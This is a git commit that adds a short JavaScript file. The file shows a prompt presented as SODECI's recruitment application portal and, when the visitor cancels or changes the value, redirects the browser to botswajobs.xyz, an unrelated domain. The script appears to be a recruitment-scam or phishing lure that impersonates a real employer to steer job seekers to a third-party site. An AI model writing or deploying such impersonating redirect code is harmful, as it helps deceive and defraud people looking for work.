0498a21ea7a8e637cd1b04564ffd695fee2cc9a6
newetijazz2 <newetijazz2@gmail.com>
2025-08-10 11:11:47 +0100

    Create Sodeci.js

---
+++ Sodeci.js
@@ -0,0 +1,6 @@
+
+var password = 'SODECI Recrutement'
+password=prompt('SODECI: Bienvenue sur le portail de candidature de la SODECI, appuyez sur OK pour postuler au','SODECI Recrutement');
+if (password != 'SODECI Recrutement') {
+location.href='https://www.botswajobs.xyz/Sodeci-Recrutement';
+}
